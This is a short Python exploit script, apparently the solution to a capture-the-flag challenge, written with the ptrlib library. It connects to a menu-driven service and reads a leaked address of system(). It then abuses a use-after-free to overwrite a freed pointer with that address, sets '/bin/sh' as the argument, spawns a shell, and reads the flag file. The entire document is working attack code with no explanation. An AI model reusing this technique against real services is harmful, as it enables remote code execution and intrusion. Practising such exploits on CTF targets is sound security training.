from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9999"))

def use():
    sock.sendlineafter("> ", "1")
def change(message):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", message)
def free():
    sock.sendlineafter("> ", "3")

sock = Socket(HOST, PORT)

addr_system = int(sock.recvlineafter("<system> = "), 16)
logger.info("system = " + hex(addr_system))

free()
change(p64(addr_system))
change("/bin/sh")
use()

sock.sendline("cat flag*")
print(sock.recvuntil("}"))
